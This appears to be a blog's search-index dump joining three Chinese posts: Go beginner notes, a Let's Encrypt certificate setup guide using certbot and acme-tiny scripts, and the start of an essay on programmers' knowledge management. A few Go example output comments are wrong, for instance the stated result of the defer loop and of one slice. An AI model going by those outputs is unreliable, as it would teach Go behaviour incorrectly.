Go中初始、条件等语句不需要用 () 阔起来 主体部分必须用花括号 {} 阔起来  defer defer 语句用于延迟函数的执行直到当前函数 return，但是 defer 的参数会立刻生成。\n多个defer语句会进行 压栈，最后执行时是 LIFO:\nfmt.Println(\u0026#34;begin\u0026#34;) for i := 0; i \u0026lt; 3; i++ { defer fmt.Println(i) } fmt.Println(\u0026#34;done\u0026#34;) // 返回: begin -\u0026gt; end -\u0026gt; 2 -\u0026gt; 1 -\u0026gt; 0 Pointers i := 100 var p1 *int // 如果没有初始化，则零值是`nil` p1 = \u0026amp;i p2 := \u0026amp;i *p2 = 101 fmt.Println(i, *p1, *p2)  *T 在声明时表示指向值T的指针 \u0026amp; 用于对值 取址 *p 在使用时表示对指针的 解引用，即取指针指向的值。  这里*需要注意，在不同地方的含义不一样。\nStruct 结构体用法:\ntype Vertex struct { X int Y int } var v Vertex = Vertex{3, 5} // 结构体初始化 v.X = 6 // 通过dot获取结构体字段 fmt.Println(v) p := \u0026amp;v // 结构体指针 (*p).X = 7 // 结构体指针获取结构体字段 fmt.Println(v) p.X = 8 // 上面的用法太笨拙，这个更简单 fmt.Println(v) // 输出: // {6 5} // {7 5} // {8 5}  // Struct Literals 结构体字面值 v1 := Vertex{X: 1} // X: 1, Y: 0 v2 := Vertex{} // X: 0, Y: 0 p := \u0026amp;Vertex{1, 2} // has type *Vertex fmt.Println(v1, v2, p) // 输出: {1 0} {0 0} \u0026amp;{1 2} // 注意p的输出结构式带有`\u0026amp;`，表示输出的是结构体指针  Array 数组是定长的 [n]T\nvar a1 [2]string a1[0] = \u0026#34;hello\u0026#34; a1[1] = \u0026#34;world\u0026#34; a2 := [3]int{1, 2, 3} fmt.Println(a1, a2) // 输出: [hello world] [1 2 3] 注意长度 [n] 也是类型的一部分\nSlice 数组是定长的，Go还提供了切片这个数据结构，长度是动态变化的，所以这个用的比数组更频繁。\n（刚看到 slice/切片 这个词，第一反应是一个函数，结果是一个数据结构\u0026hellip;）\n因为长度是动态变化，所以声明是 []T，括号中不写。\nGo中做切片（这里是动词）操作，返回的是切片。\narray := [3]int{1, 2, 3} var slice1 []int = array[1:3] slice2 := array[0:2] fmt.Println(slice1, slice2) // import \u0026#34;reflect\u0026#34; fmt.Println(reflect.TypeOf(slice1), reflect.TypeOf(slice2)) // 输出: // [2 3] [1] // []int []int 切片自身并不存储数据，它是对底层数组的引用。\n所以对切片中数据的修改，会影响相应的底层数组的值，也会影响其它引用到这个数组的切片\n// 接上面的例子 slice1[0] = 100 fmt.Println(array, slice1, slice2) // 输出: [1 100 3] [100 3] [1 100] 切片字面值（slice literal）和数组字面值（array literal）一样，只是不需要指定长度:\nslice1 := []int{1, 2, 3} slice2 := []struct { i int b bool }{ {1, true}, {2, false}, {3, true}, // 注意最后的逗号不能省略 } fmt.Println(slice1, slice2) // 输出: [1 2 3] [{1 true} {2 false} {3 true}] 上面注意最后的逗号不能省略，否则报错：\n missing \u0026lsquo;,\u0026rsquo; before newline in composite literal\n 原因参考 这个回答：\n a semicolon is automatically inserted into the token stream at the end of a non-blank line if the line\u0026rsquo;s final token is\n \u0026hellip; one of the operators and delimiters ++, \u0026ndash;, ), ], or }   切片的使用和 Python 类似，支持:\ns[0:10] s[:10] s[0:] s[:] 切片有 length 和 capacity 的概念\n length 通过 len(s) 获取，表示切片中元素的个数 capacity 通过 cap(s) 获取，表示切片引用的 底层数组 中元素的个数，从切片的第一个元素开始计算  下面这个例子比较有意思，感觉容易入坑:\nfunc printSlice(s []int) { fmt.Printf(\u0026#34;len=%d cap=%d %v\\n\u0026#34;, len(s), cap(s), s) } func main() { s := []int{1, 2, 3, 4, 5} printSlice(s) s = s[:0] printSlice(s) s = s[:4] // 注意这里还可以扩展，因为是引用，底层数组一直存在  printSlice(s) s = s[2:5] // 这里capacity就减少了  printSlice(s) } // 输出 // len=5 cap=5 [1 2 3 4 5] // len=0 cap=5 [] // len=4 cap=5 [1 2 3 4] // len=3 cap=3 [3 4 5] 切片的零值是 nil:\nvar s []int // 注意和s := []int{}不一样，这个是空切片，赋值过的 fmt.Println(s, len(s), cap(s)) if s == nil { fmt.Println(\u0026#34;slice is nil\u0026#34;) } make 函数可以用来创建切片，并指定 length（必选）和 capacity（可选）:\ns1 := make([]int, 3) printSlice(s1) s2 := make([]int, 3, 5) printSlice(s2) // 输出 // len=3 cap=3 [0 0 0] // len=3 cap=5 [0 0 0] 二维切片(类似C中二维数组):\n// len(s) = 2, cap(s) = 2 s := [][]string{ []string{\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;}, []string{\u0026#34;c\u0026#34;, \u0026#34;d\u0026#34;}, } Go对切片的 append 操作提供了内置函数append(s []T, v1, v2, v3, ...T) []T，最后返回append后的切片; 因为切片大小是动态的，所以如果capacity不够，会自动扩容:\ns := make([]int, 1, 3) printSlice(s) s = append(s, 1) printSlice(s) s = append(s, 2, 3) printSlice(s) // 输出: // len=1 cap=3 [0] // len=2 cap=3 [0 1] // len=4 cap=6 [0 1 2 3] for循环切片:\ns := []int{1, 2, 3} // i 是切片索引，v是值的一个copy for i, v := range s { fmt.Println(i, v) } // i 是切片索引 for i := range s { fmt.Println(s[i]) } 和Python一样，如果不关心索引，可以直接赋值给变量名_\n关于 range 的扩展阅读：\n 聊聊Go中的Range关键字 unicode — Unicode码点、UTF-8/16编码 go wiki - Range Go by Example: Range  Maps 映射（也就是字典吧）表示一个 key/value 对集合，声明语法:\nvar map_name map[map_key_type]map_value_type map_value_type 表示 map 值的类型，类似于 slice 的 []int 这种表示 slice 中的值是 int。\n即:\ntype Vertex struct { X int Y int } var m map[string]Vertex // 声明  func main() { m = make(map[string]Vertex) // 创建  m[\u0026#34;a\u0026#34;] = Vertex{3, 4} m[\u0026#34;b\u0026#34;] = Vertex{1, 2} fmt.Println(m) } // 输出: map[a:{3 4} b:{1 2}] 只声明的map，零值是nil，nil map不能添加key/values，即没有下面的make则后面不能操作。\n声明、创建这块也可以直接写为m := map[string]Vertex\n映射字面值(map literal):\nvar m = map[string]Vertex{ \u0026#34;a\u0026#34;: Vertex{3, 4}, \u0026#34;b\u0026#34;: Vertex{1, 2}, // 注意逗号 } // If the top-level type is just a type name, you can omit it from the elements of the literal. // 按我理解是表示 map 已经定义了值的类型，所以在里面的字面值不需要再定义 // 下面是简写，省去内部的值类型 var m = map[string]Vertex{ \u0026#34;a\u0026#34;: {3, 4}, \u0026#34;b\u0026#34;: {1, 2}, } map的几个操作:\n// 修改某个key的value m[k] = v // 获取某个key的value v = m[k] // 删除某个key delete(m, k) // 测试某个key是否在m中 // ok是boolean，存在则为true，否则是false v, ok = m[k] Methods Go没有类，但是可以给自定义类型（如结构体）定义方法（methods）。\nmethod 和 function 类似，只不过多了一个特殊的接收者参数（receiver），位置在 func 关键字和 method name 之间。\n// 如这里定义Abs这个方法，属于Vertex这个结构体，`(v Vertex)`就是function没有的多出的部分 func (v Vertex) AbsMethod() float64 { return math.Sqrt(v.X*v.X + v.Y*v.Y) } // 调用 v := Vertex{3, 4} fmt.Println(v.AbsMethod()) // 这个是function, 将Vertex结构体当普通参数 func AbsFunc(v Vertex) float64 { return math.Sqrt(v.X*v.X + v.Y*v.Y) } // 调用 v := Vertex{3, 4} fmt.Println(AbsFunc(v)) 如上所说，不光结构体可以声明方法，比如自定义类型:\ntype MyFloat float64 func (f MyFloat) Abs() float64 { if f \u0026lt; 0 { return float64(-f) } return float64(f) } 但是 receiver的类型必须定义在当前包里，不能给其它包里定义的类型声明method，比如内置类型。\n上面使用的 receiver 是一个值（value receiver），receiver还可以是一个指针（pointer receiver），如:\n// method func (v *Vertex) ScaleMethod(f float64) { v.X = v.X * f v.Y = v.Y * f } // function func ScaleFunc(v *Vertex, f float64) { v.X = v.X * f v.Y = v.Y * f } 因为Go里函数参数是传值，相当于一份拷贝，所以如果使用 func (v Vertex) Scale... 而不是 func (v *Vertex) Scale... ，则实际 v.X 和 v.Y 的值并没有被改变。\n关于这块调用 Scale 时针对 pointer 和 value，需要注意一个坑:\nvar v Vertex // 针对上面的Scale ScaleFunc(v, 3) // compile error! ScaleFunc(\u0026amp;v, 3) // ok v.ScaleMethod(3) // ok, as (\u0026amp;v).ScaleMethod() p := \u0026amp;v p.ScaleMethod(3) // ok  // 针对上上面的Abs AbsFunc(v) // ok AbsFunc(\u0026amp;v) // compile error! v.AbsMethod() // ok p := \u0026amp;v p.AbsMethod() // ok, as (*p).AbsMethod() 为了方便，Go的解释器对 method 作了一些自动化处理，如上例子，不论是 pointer receiver 还是 value receiver 的方法，都可以通过 pointer 或 value 来调用。\n更倾向于选择使用 pointer receiver 的原因有两个:\n method 内部可以修改 receiver 的值 不是按值传递，所以更节省空间，比如需要传递的是一个很大的结构体  Interfaces Go Tour上这块英文感觉有点绕，需要多读几遍。\n An interface type is defined as a set of method signatures.\n 一个接口类型是一组 method 的定义的集合。\n A value of interface type can hold any value that implements those methods.\n 接口类型是一个抽象类型，它的值可以是任何值，只需要这个值实现了接口的 methods\n接口的好处就是将接口的定义和实现分离。\n// 接口类型 type I interface { M() } // 具体类型 type T struct { S string } func (t *T) M() { fmt.Println(t.S) } // 具体类型 type F float64 func (f F) M() { fmt.Println(f) } func main() { var i I i = \u0026amp;T{\u0026#34;Hello\u0026#34;} fmt.Printf(\u0026#34;(%v, %T)\\n\u0026#34;, i, i) i.M() i = F(0.11) fmt.Printf(\u0026#34;(%v, %T)\\n\u0026#34;, i, i) i.M() } // 输出 // (\u0026amp;{Hello}, *main.T) // Hello // (0.11, main.F) // 0.11 一个接口需要挂载到一个底层具体类型上，调用接口的方法实际就是调用底层具体类型的同名方法.\n如果实际类型是 nil (nil underlying value)，则接口也是 nil\n但如果接口类型是 nil (nil interface value)，则无法调用它的 method，否则报错\n空接口定义: var i interface{}，接口i可以是任何值。\n类型断言（type assertion）让接口值可以访问所挂载具体类型的值: t := i.(T)，其中i是接口值，T是具体类型名：\nvar i interface{} = \u0026#34;hello\u0026#34; s := i.(string) fmt.Println(s) s, ok := i.(string) fmt.Println(s, ok) // 这个和之前的map test类似 f, ok := i.(float64) fmt.Println(f, ok) f = i.(float64) // panic fmt.Println(f) type switch 结合了接口类型和switch语句，语法i.(type)，和type assertion语法有点像。\n// i is interface switch v := i.(type) { case int: fmt.Printf(\u0026#34;Twice %v is %v\\n\u0026#34;, v, v*2) case string: fmt.Printf(\u0026#34;%q is %v bytes long\\n\u0026#34;, v, len(v)) default: fmt.Printf(\u0026#34;I don\u0026#39;t know about type %T!\\n\u0026#34;, v) } fmt包中定义了Stringer接口，方法String()，如目前用到最多的fmt.Println()就根据类型的String()方法输出内容:\n// type Stringer interface { // String() string // } type Person struct { Name string Age int } func (p Person) String() string { return fmt.Sprintf(\u0026#34;%v (%v years)\u0026#34;, p.Name, p.Age) } func main() { a := Person{\u0026#34;Arthur Dent\u0026#34;, 42} fmt.Println(a) goroutine 轻量级线程(lightweight thread)\ngoroutines在同一个地址空间中运行，所以访问共享内存必须进行同步\n使用关键字go，go func(x, y)中x, y是在当前goroutine中定义，但是func的执行是在一个新的goroutine:\nfunc say(s string) { for i := 0; i \u0026lt; 5; i++ { time.Sleep(100 * time.Millisecond) fmt.Println(s) } } func main() { go say(\u0026#34;world\u0026#34;) say(\u0026#34;hello\u0026#34;) } 如果当前goroutine结束，则新起的goroutine也会结束。所以这个和执行时间、顺序有关系，上面的例子会出现偶尔world只输出4次的情况。如果去掉time.Sleep，则可能会出现world还没来得及输出就已经结束了。\nchannel channel是一个有类型的管道(typed conduit)，可以用来接收或发送数据，操作符\u0026lt;-，channel 和 \u0026lt;-的方向表示了数据流的方向:\nch \u0026lt;- v // 发送v到channel ch v := \u0026lt;-ch // 接收来自channel ch的数据，并赋值给v 和slice，map类似，channel 在使用前需要创建:\nch := make(chan int) 默认情况下，在另一端准备好之前，发送和接收都会阻塞。这使得 goroutine 可以在没有明确的锁或竞态变量的情况下进行同步。\npackage main import \u0026#34;fmt\u0026#34; func sum(s []int, c chan int) { sum := 0 for _, v := range s { sum += v } c \u0026lt;- sum // send sum to c } func main() { s := []int{7, 2, 8, -9, 4, 0} c := make(chan int) go sum(s[:len(s)/2], c) go sum(s[len(s)/2:], c) x, y := \u0026lt;-c, \u0026lt;-c // receive from c  fmt.Println(x, y, x+y) } 上面例子是goroutine和channel的配合。\n创建channel时，第二个参数可以指定channel大小，使其为buffered channel:\npackage main import \u0026#34;fmt\u0026#34; func main() { ch := make(chan int, 2) ch \u0026lt;- 1 ch \u0026lt;- 2 fmt.Println(\u0026lt;-ch) fmt.Println(\u0026lt;-ch) } 如果是buffered channel，则如果buffer满了，则发送给channel会被block; 如果buffer空了，则从channel读取数据会被block。\n上面例子如果在\u0026lt;-ch之前再写数据进ch，会导致报错: fatal error: all goroutines are asleep - deadlock!\n在读取channel时，如果指定第二个参数，可以确认channel是否关闭。对channel进行for循环可以持续从channel读取数据，直到channel关闭。\nch := make(chan int) close(ch) // 关闭channel v, ok := \u0026lt;-ch // 检查channel是否关闭 for i := range ch { // 持续从channel读取数据  ... } select 语句用于从多个channel中选出一个可用的channel来执行，都没有则block，如果有多个则随机选一个; 如果有default case，则不会block，没有任何case可执行时则用default case\nselect { case \u0026lt;-c1: ... case \u0026lt;-c2: ... default: ... } ","permalink":"https://www.fenghong.tech/blog/go/go-tutorial/","tags":["go","resources"],"title":"Go入门笔记"},{"categories":["ops"],"contents":"Let’s Encrypt 及 Certbot 简介 Let’s Encrypt 是 一个叫 ISRG （ Internet Security Research Group ，互联网安全研究小组）的组织推出的免费安全证书计划。参与这个计划的组织和公司可以说是互联网顶顶重要的先驱，除了前文提到的三个牛气哄哄的发起单位外，后来又有思科（全球网络设备制造商执牛耳者）、 Akamai 加入，甚至连 Linux 基金会也加入了合作，这些大牌组织的加入保证了这个项目的可信度和可持续性。\n尽管项目本身以及有该项目签发的证书很可信，但一开始 Let’s Encrypt 的安全证书配置起来比较麻烦，需要手动获取及部署。存在一定的门槛，没有一些技术底子可能比较难搞定。然后有一些网友就自己做了一些脚本来优化和简化部署过程。 1. 获取 Certbot 客户端\nwget https://dl.eff.org/certbot-auto chmod a+x ./certbot-auto ./certbot-auto --help 2. 配置 nginx 、验证域名所有权\n在虚拟主机配置文件/usr/local/nginx/conf/vhost/fenghong.tech.conf中添加如下内容，这一步是为了通过 Let’s Encrypt 的验证，验证 fenghong.tech 这个域名是属于我的管理之下。（具体解释可见下一章“一些补充说明”的“ certbot 的两种工作方式”）\n location ^~ /.well-known/acme-challenge/ { default_type \u0026quot;text/plain\u0026quot;; root /www; } location = /.well-known/acme-challenge/ { return 404; } 3. 重载 nginx\n配置好 Nginx 配置文件，重载使修改生效（如果是其他系统 nginx 重载方法可能不同）\n sudo nginx -s reload 4. 生成证书\n./certbot-auto certonly --webroot -w /www -d fenghong.tech 中间会有一些自动运行及安装的软件，不用管，让其自动运行就好，有一步要求输入邮箱地址的提示，照着输入自己的邮箱即可，顺利完成的话，屏幕上会有提示信息。\n此处有坑！如果顺利执行请直接跳到第五步，我在自己的服务器上执行多次都提示\nconnection :: The server could not connect to the client for DV :: DNS query timed out 发现问题出在 DNS 服务器上，我用的是 DNSpod ，无法通过验证，最后是将域名的 DNS 服务器临时换成 Godaddy 的才解决问题，通过验证，然后再换回原来的 DNSpod 。 证书生成成功后，会有 Congratulations 的提示，并告诉我们证书放在 /etc/letsencrypt/live 这个位置\nIMPORTANT NOTES: - The following errors were reported by the server: Domain: fenghong.tech Type: unauthorized Detail: Invalid response from http://fenghong.tech/.well-known/acme-challenge/kx-juv4XwQFz1TkhL1xGNda5Nm8_fwa8rQoRUfvS01c: \u0026quot;\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n \u0026lt;head\u0026gt;\\n \u0026lt;meta http-equiv=\\\u0026quot;Content-type\\\u0026quot; content=\\\u0026quot;text/html; charset=utf-8\\\u0026quot;\u0026gt;\\n \u0026lt;meta http-equiv=\\\u0026quot;Co\u0026quot; Domain: www.fenghong.tech Type: unauthorized Detail: Invalid response from http://www.fenghong.tech/.well-known/acme-challenge/B0jELU0RmyeEt9xA9FKi6NTxj4m5PjJlvx4iCXNR4d8: \u0026quot;\u0026lt;!DOCTYPE html\u0026gt;\\n\u0026lt;html\u0026gt;\\n \u0026lt;head\u0026gt;\\n \u0026lt;meta http-equiv=\\\u0026quot;Content-type\\\u0026quot; content=\\\u0026quot;text/html; charset=utf-8\\\u0026quot;\u0026gt;\\n \u0026lt;meta http-equiv=\\\u0026quot;Co\u0026quot; To fix these errors, please make sure that your domain name was entered correctly and the DNS A/AAAA record(s) for that domain contain(s) the right IP address. 这个问题是因为自己的A记录是指向了github.io，导致配置文件根本读取不到，取消gitub的A记录即可，保持自己的A记录指向自己的IP哦！\nIMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/fenghong.tech/fullchain.pem. Your cert will expire on 2019-02-0. To obtain a new version of the certificate in the future, simply run Let's Encrypt again. 5. 配置 Nginx（修改 /usr/local/nginx/conf/vhost/fenghong.tech.conf），使用 SSL 证书\nlisten 443 ssl; server_name fenghong.tech www.fenghong.tech; index index.html index.htm index.php; root /www; ssl_certificate /etc/letsencrypt/live/fenghong.tech/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/fenghong.tech/privkey.pem; 上面那一段是配置了 https 的访问，我们再添加一段 http 的自动访问跳转，将所有通过 http://www.fenghong.tech 的访问请求自动重定向到 https://fenghong.tech\nserver { listen 80; server_name fenghong.tech www.fenghong.tech; return 301 https://$server_name$request_uri; } 6. 重载 nginx，大功告成，此时打开网站就可以显示绿色小锁了\n sudo nginx -s reload ♦后续工作 出于安全策略， Let’s Encrypt 签发的证书有效期只有 90 天，所以需要每隔三个月就要更新一次安全证书，虽然有点麻烦，但是为了网络安全，这是值得的也是应该的。好在 Certbot 也提供了很方便的更新方法。\n 测试一下更新，这一步没有在真的更新，只是在调用 Certbot 进行测试  ./certbot-auto renew --dry-run 如果出现类似的结果，就说明测试成功了（总之有 Congratulations 的字眼）\nCongratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/wiki.fenghong.tech/fullchain.pem (success) /etc/letsencrypt/live/fenghong.tech/fullchain.pem (success) ** DRY RUN: simulating 'certbot renew' close to cert expiry ** (The test certificates above have not been saved.) 手动更新的方法  ./certbot-auto renew -v 自动更新的方法  ./certbot-auto renew --quiet --no-self-upgrade ♦一些补充说明解释 1、certbot-auto 和 certbot\ncertbot-auto 和 certbot 本质上是完全一样的；不同之处在于运行 certbot-auto 会自动安装它自己所需要的一些依赖，并且自动更新客户端工具。因此在你使用 certbot-auto 情况下，只需运行在当前目录执行即可\n./certbot-auto 2、certbot的两种工作方式\ncertbot （实际上是 certbot-auto ） 有两种方式生成证书：\n standalone 方式： certbot 会自己运行一个 web server 来进行验证。如果我们自己的服务器上已经有 web server 正在运行 （比如 Nginx 或 Apache ），用 standalone 方式的话需要先关掉它，以免冲突。 webroot 方式： certbot 会利用既有的 web server，在其 web root目录下创建隐藏文件， Let’s Encrypt 服务端会通过域名来访问这些隐藏文件，以确认你的确拥有对应域名的控制权。  本文用的是 webroot 方式，也只推荐 webroot 方式，这也是前文第二步验证域名所有权在 nginx 虚拟主机配置文件中添加 location 段落内容的原因。\n试了下这个脚本，在它的基础上改了一些，签发/更新比较方便（其实就是重新签发）。核心是使用diafygi/acme-tiny，相对于certbot复杂以及各种环境检查，安装一堆东西，这个Python写的工具我感觉好用多了，在傻瓜式和使用上选择了一个折中合适的点。\n一个快速获取/更新 Let\u0026rsquo;s encrypt 证书的 shell script  调用 acme_tiny.py 认证、获取、更新证书，不需要额外的依赖。\n下载到本地\nwget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.conf wget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.sh chmod +x letsencrypt.sh 配置文件\n只需要修改 DOMAIN_KEY DOMAIN_DIR DOMAINS 为你自己的信息\nACCOUNT_KEY=\u0026quot;letsencrypt-account.key\u0026quot; DOMAIN_KEY=\u0026quot;example.com.key\u0026quot; DOMAIN_DIR=\u0026quot;/var/www/example.com\u0026quot; DOMAINS=\u0026quot;DNS:example.com,DNS:whatever.example.com\u0026quot; #ECC=TRUE #LIGHTTPD=TRUE 执行过程中会自动生成需要的 key 文件。其中 ACCOUNT_KEY 为账户密钥， DOMAIN_KEY 为域名私钥， DOMAIN_DIR 为域名指向的目录，DOMAINS 为要签的域名列表， 需要 ECC 证书时取消 #ECC=TRUE 的注释，需要为 lighttpd 生成 pem 文件时，取消 #LIGHTTPD=TRUE 的注释。\n运行\n./letsencrypt.sh letsencrypt.conf 注意\n需要已经绑定域名到 /var/www/example.com 目录，即通过 http://example.com http://whatever.example.com 可以访问到 /var/www/example.com 目录，用于域名的验证\n将会生成如下几个文件\nlets-encrypt-x1-cross-signed.pem example.chained.crt # 即网上搜索教程里常见的 fullchain.pem example.com.key # 即网上搜索教程里常见的 privkey.pem example.crt example.csr  在 nginx 里添加 ssl 相关的配置\nssl_certificate /path/to/cert/example.chained.crt; ssl_certificate_key /path/to/cert/example.com.key;  cron 定时任务\n每个月自动更新一次证书，可以在脚本最后加入 service nginx reload等重新加载服务。\n0 0 1 * * /etc/nginx/certs/letsencrypt.sh /etc/nginx/certs/letsencrypt.conf \u0026gt;\u0026gt; /var/log/lets-encrypt.log 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; nginx -s reload 多个域名处理\n我有aaa.com和bbb.com，在同一个主机里进行https证书生成，这时，我们生成两个比如aaa.conf和bbb.conf.生成两个文件后，脚本运行两次即可。当然配置文件内容请看上面的信息，按需更改。 利用crontab 进行每月更新，具体如上，就不赘述了。\n./letsencrypt.sh aaa.conf ./letsencrypt.sh bbb.conf lets-dns 下载\nwget https://github.com/xdtianyu/scripts/raw/master/le-dns/le-dnspod.sh wget https://github.com/xdtianyu/scripts/raw/master/le-dns/dnspod.conf chmod +x le-dnspod.sh 配置\ndnspod.conf 文件内容\nTOKEN=\u0026quot;YOUR_TOKEN_ID,YOUR_API_TOKEN\u0026quot; RECORD_LINE=\u0026quot;默认\u0026quot; DOMAIN=\u0026quot;example.com\u0026quot; CERT_DOMAINS=\u0026quot;example.com www.example.com im.example.com\u0026quot; #ECC=TRUE 修改其中的 TOKEN 为您的 dnspod api token ，注意格式为123456,556cxxxx。 修改 DOMAIN 为你的根域名，修改 CERT_DOMAINS 为您要签的域名列表，需要 ECC 证书时请取消 #ECC=TRUE 的注释。\n运行\n[root@aliyun_file nginx]# ./le-dnspod.sh dnspod.conf # INFO: Using main config file dnspod.conf + Account already registered! # INFO: Using main config file dnspod.conf Processing www.fenghong.tech with alternative names: wiki.fenghong.tech cloud.fenghong.tech + Creating new directory ./certs/www.fenghong.tech ... + Signing domains... + Generating private key... + Generating signing request... + Requesting new certificate order from CA... + Received 3 authorizations URLs from the CA + Handling authorization for cloud.fenghong.tech + Handling authorization for www.fenghong.tech + Handling authorization for wiki.fenghong.tech + 3 pending challenge(s) + Deploying challenge tokens... cloud.fenghong.tech MszO0HsThuxa2OD5JOggj3xodgCjwhRybBpKaDUjarM gpxslsY3Hl9croCAQBHYUOveXZpuwoPaZlvqtzOMtBg _acme-challenge.cloud.fenghong.tech fenghong.tech 69699373 _acme-challenge.cloud:391234194 UPDATE RECORD DNS UPDATE SUCCESS www.fenghong.tech rGUqFsbLKL8ygoZSjn-6iMrP6LriMaaMwqcD5iI0MLc jxbDA17eWGgxq1gydYyh1mZ0Y-1UxP3KmASkg5vV4oA _acme-challenge.www.fenghong.tech fenghong.tech 69699373 _acme-challenge.www:391234826 UPDATE RECORD DNS UPDATE SUCCESS wiki.fenghong.tech Tpx0U3AJxgC3k7jfr2kUPTPcRVYV4hyaH6uWhikfFDo Hs7rqkI5sDhLjAPe7Q8gpYt6PW2Ov6eV1U4-sKurwaU _acme-challenge.wiki.fenghong.tech fenghong.tech 69699373 _acme-challenge.wiki:391218779 UPDATE RECORD DNS UPDATE SUCCESS + Responding to challenge for cloud.fenghong.tech authorization... + Challenge is valid! + Responding to challenge for www.fenghong.tech authorization... + Challenge is valid! + Responding to challenge for wiki.fenghong.tech authorization... + Challenge is valid! + Cleaning challenge tokens... + Requesting certificate... + Checking certificate... + Done! + Creating fullchain.pem... + Done! 最后生成的文件在当前目录的 certs 目录下\ncron 定时任务\n如果证书过期时间不少于30天， letsencrypt.sh 脚本会自动忽略更新，所以至少需要29天运行一次更新。\n每隔20天(每个月的5号和25号)自动更新一次证书，可以在 le-dnspod.sh 脚本最后加入 service nginx reload等重新加载服务。\n0 0 5/20 * * /etc/nginx/le-dnspod.sh /etc/nginx/le-dnspod.conf \u0026gt;\u0026gt; /var/log/le-dnspod.log 2\u0026gt;\u0026amp;1\n注意 ubuntu 16.04 不能定义 day of month 含有开始天数的 step values，可以替换命令中的 5/20 为 5,25。\n更详细的 crontab 参数请参考 crontab.guru 进行自定义 下载文件\n其它参考   Let\u0026rsquo;s Encrypt，免费好用的 HTTPS 证书\n  Let’s Encrypt免费HTTPS SSL证书获取教程\n  用Let’s Encrypt获取免费证书\n  免费SSL证书Let’s Encrypt安装使用教程:Apache和Nginx配置SSL\n  How To Secure Nginx with Let\u0026rsquo;s Encrypt on Ubuntu 14.04\n  一个快速获取/更新 Let\u0026rsquo;s encrypt 证书的 shell script | 另外一个\n  Cipherli.st 提供了各种webserver和一些软件的ssl推荐配置\n  SSL Server Test 站点https安全分析/检查\n  实践个人网站迁移HTTPS与HTTP/2\n  Wiki · Tanky Woo\n  ","permalink":"https://www.fenghong.tech/blog/2018/2018-11-08-lets-encrypt/","tags":["Linux","nginx","certbot","https","acmeTiny","Python"],"title":"Let’s Encrypt使用"},{"categories":["tools"],"contents":"[TOC]\n前言 本文从一个程序员的视角来讨论知识管理，包括以下几个方面：\n 什么是知识管理 为什么要管理知识 如何管理知识  什么是知识管理  个人知识管理（Personal Knowledge Management）：一般指个人通过工具建立知识体系并不断完善，进行知识的收集、消化吸收和创新的过程。\n 知识管理的范围很广，一般的知识管理方法可以参考这篇文章 个人知识管理的方法。\n为什么要管理知识 计算机行业的一个特点是新技术更新特别快，意味着程序员需要不停地学习，才能跟上行业的发展。所以，知识管理对程序员非常重要。有意识，成体系地管理知识能够：\n 更有效地学习新的知识。 如果我们已经建立好一个技术知识体系，新的技术也只是在其他技术上建立起来的，有了坚实基础，学习新技术就会更有效。 更好地掌握知识。 使用合适的工具，正确的方法，可以更好地掌握知识，让知识凝固在脑海，而不是流走。 节约时间成本。 程序员经常遇到同样的问题，例如说部署开发环境的时候，如果有把解决方案记录下来，就能省去重新解决问题的时间。  如何管理知识 程序员的知识获取途径大部分来自于搜索引擎（谷歌可以提高搜索效率）和技术书籍，这与其他行业不同。主要原因是技术知识一个主要来源是互联网，例如说技术博客，技术文档等。因此，程序员的知识管理主要围绕互联网展开（并不意味着书籍就不重要）。\n我把程序员的知识管理分为三个过程：\n 知识积累 碎片整理 思考加工  知识积累 想想我们习以为常的知识积累方式有哪些？也许记笔记是我们最常用的一种。对于程序员来说，用笔记录笔记并不现实，我刚学 C++ 的时候就是把语法记在笔记上。实际上，这种做法是很低效的。更有效的方法是用笔记软件帮我们记录文章。例如说，印象笔记，有道笔记等。\n一开始我看到好的技术文章时，都是加书签存起来。后面发现这样不能离线访问，而且链接可能会失效。后来用上了笔记软件，于是我可以把文章保存到笔记中，随时可以翻出来看。可以说，笔记软件给知识积累带来了极大方便，同时可以分类管理不同的知识。\n知识积累难在养成积累的习惯。以前我解决某个问题，谷歌了很久找到一篇文章解决了问题。解决之后并没有记录下来，结果下一次遇到同样问题，我又浪费了很多时间搜索解决方法。重复多次之后，我意识到这是个严重的问题。所以逐渐养成了保存各种文章的习惯。这些网上积累下来的文章，成为了我知识体系的土壤。\n现在开始，使用笔记软件分门别类地保存网上看到的文章，这里要着重强调一下分类的重要性，好的分类可以节省你以后重新检索文章的时间，不要把时间浪费在不必要的劳动上。笔记软件一般都会提供浏览器插件，保存起来是很方便的。\n碎片整理 我自己经常遇到这样的情况：要用到某个 Linux 命令的时候，经常大费周章地去搜索。有人说直接查 man 手册不是很快吗？确实查 man 手册比查搜索引擎要快，但是有两个问题：一是看了 man 手册的命令语法，我还得试试看；二是如果我不知道命令的名字怎么查 man。所以，最快的方法不是搜索引擎，也不是 man 手册，而是个人 wiki。\n与大家平常所知的 wiki 不同，个人 wiki 主要是用来记录知识碎片的，例如说：某个常用命令的语法，特定的软件配置等等。如果还是不理解，可以看看我的个人 Wiki。这些知识碎片是我们初步消化的知识，只不过因为太过碎片，不能够组成完整的知识体系。很多人以为把看到的文章保存到自己的笔记里面，就有一种已经掌握它的错觉，结果保存了成千上百的文章，却一篇都没认真看完。别人的文章是他的知识沉淀，并不是自己的。随时把文章中的精华提取整理到 wiki，才能初步消化知识，为后面的思考加工做准备。\n有人会问为什么不用笔记软件记录这些碎片化的知识呢？用 wiki 当然是有理由的：\n **笔记软件保存的主要是知识原料。**我们从网上保存别人的文章到笔记，存下来的知识是别人的，你只是存下来而已，还没经过消化。我们上面把笔记软件定义为知识的仓库，如果把初步消化后的知识也存在那里，会造成一定的混乱。当然你一定要这么做也可以，但我有分层的思维定势，这算是职业病吧。 **wiki 是随处可访问的。**wiki 发布在互联网上，我们可以随时随地访问它。 **wiki 是分享的。**任何人都可以访问你的 wiki，分享自己的知识何乐而不为呢？  那么如何制作自己的 wiki 呢？我自己用的是 Simiki，具体用法查看 Simiki-个人Wiki写作。发布到互联网我用的是 ECS加hexo博客，具体操作自行搜索。\n思考加工 写博客是最好的思考加工知识的方法。当年我也是被刘未鹏的 为什么你应该（从现在开始就）写博客 和 书写是为了更好的思考 